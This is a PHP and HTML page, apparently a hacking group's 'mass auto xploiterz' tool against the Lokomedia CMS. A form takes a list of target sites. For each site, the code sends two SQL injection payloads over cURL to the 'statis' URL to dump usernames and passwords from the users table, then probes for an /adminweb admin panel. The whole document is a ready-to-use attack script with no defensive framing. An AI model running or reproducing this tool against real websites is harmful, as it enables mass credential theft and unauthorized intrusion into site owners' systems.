<html>
<link rel="SHORTCUT ICON" href="http://kefiex.yu.tl/files/bnx.png">
<title>-=[ LOKOMEDIA SQL INJECTION ]=-</title>
<meta content='IDBTE4M' name='description'/>
<meta content='IDBTE4M' name='keywords'/>
<meta content='IDBTE4M' name='Abstract'/>
<meta name='title' content='xxx'>
<meta content='magento' name='description'/>
<meta content='xploit' name='keywords'/>
<meta content='sex' name='Abstract'/>
<meta name='title' content='IDBTE4M'>
<meta content='mp3' name='description'/>
<meta content='video' name='keywords'/>
<meta content='jkt48' name='Abstract'/>
<meta name='title' content='hacked'>
<style>
body{
background-color: #444;	
font: 10pt Verdana;
color: #fff;
}
tr,td,table,input,textarea {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
}
#domain tr:hover{
background-color: #444;
}
td {
color: #2BA8EC;
}
.listdir td{
	text-align: center;
}
.listdir th{
	color: #FF9900;
}
.dir,.file
{
	text-align: left !important;
}
.dir{
	font-size: 10pt; 
	font-weight: bold;
}
table {
BACKGROUND-COLOR: #111;
}
input {
BACKGROUND-COLOR: Black;
color: #ff9900;
}
input.submit {
text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
color: #FFFFFF;
border-color: #009900;
}
code {
border: dashed 0px #333;
color: while;
}
run {
border			: dashed 0px #333;
color: #FF00AA;
}
textarea {
BACKGROUND-COLOR: #1b1b1b;
font: Fixedsys bold;
color: #aaa;
}
A:link {
	COLOR: #2BA8EC; TEXT-DECORATION: none
}
A:visited {
	COLOR: #2BA8EC; TEXT-DECORATION: none
}
A:hover {
	text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
	color: #FFFFFF; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
.listdir tr:hover{
	background: #444;
}
.listdir tr:hover td{
	background: #444;
	text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
	color: #FFFFFF; TEXT-DECORATION: none;
}
.notline{
	background: #111;
}
.line{
	background: #222;
}
#mg img:hover {
-webkit-animation:tremer 0.5s linear infinite;
-moz-animation:tremer 0.5s linear infinite;
-o-animation:tremer 0.5s linear infinite;
animation:tremer 0.5s linear infinite;
}
#mg img{border:4px double yellow;
</style>
<font face='iceland' color='cyan'>
<center>
<h1> mass auto xploiterz sql lokomedia </h1>
<div id='mg'>

<div align='center'>
<table width='100%'border='0 '><tr><td align='left'><center><font face='Trajan Pro' size='5' color='Green' style='text-shadow: 2px 0px .2em black, -2px 2px .2em Darkcyan, -2px -2px .2em black'><b>
<font color='yellow'>-=[ P.B.M ]=-</font></center><br><img src='http://kefiex.yu.tl/files/bnx.png' height='150' width='250'/> </td><br /> 
<td align='center'>
<form method='post'>
<textarea name='sites' cols='50' rows='12'></textarea><br>
<input type='submit' name='go' value='------------=========[ LOKMED TAI ]==========-----------'>
<td align='right'><center><font face='Trajan Pro' size='5' color='Green' style='text-shadow: 2px 0px .2em black, -2px 2px .2em Darkcyan, -2px -2px .2em black'><b>
<font color='yellow'>-=[ IDBTE4M ]=-</font></center><br><img src='http://goenk.wapgem.com/idb.png' height='150' width='250'/ ></td></tr></table>
</div></center>
</FORM>
<?php
error_reporting(0);
set_time_limit(0);
$ya=$_POST['go'];
$co=$_POST['sites'];

if($ya){
$e=explode("\r\n",$co);
foreach($e as $bda){	
$fp = fopen("cookie.txt", "w+");
$Cookie = realpath('cookie.txt');
$web = $bda."/statis--1'union%20select%20/*!50000Concat*/(username,0x20,password)+from+users--+--+-profil.html";
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,"$web");
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($curl,CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl,CURLOPT_COOKIEFILE, "$Cookie");
curl_setopt($curl,CURLOPT_TIMEOUT,5);
$gweb = curl_exec($curl);
$web2 = $bda."/statis--1'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password)),@)--+-profil.html";
$curl2=curl_init();
curl_setopt($curl2,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl2,CURLOPT_URL,"$web2");
curl_setopt($curl2,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($curl2,CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl2,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl2,CURLOPT_COOKIEFILE, "$C2ookie");
curl_setopt($curl2,CURLOPT_TIMEOUT,5);
$gweb2 = curl_exec($curl2);
echo '<center><font face="courier" color="#00BFFF" >'.$bda.'</font><br><textarea rows="10" cols="40">'.htmlentities($gweb2).'</textarea>','<textarea rows="10" cols="40">'.htmlentities($gweb).'</textarea>';
$cek_admin = @file_get_contents("$bda/adminweb");
if(preg_match("/Copyright/", $cek_admin)) {
				echo "<BR><font color=green>IDBTE4M </font> => <font color=aqua><a href='$bda/adminweb' target='_blank'>$bda/adminweb</a></font><br>";
				} else {
				echo "<br>[-] <font color=red>PBM Gak Ada /adminweb</font>[-]<br>";
}
}
}
?>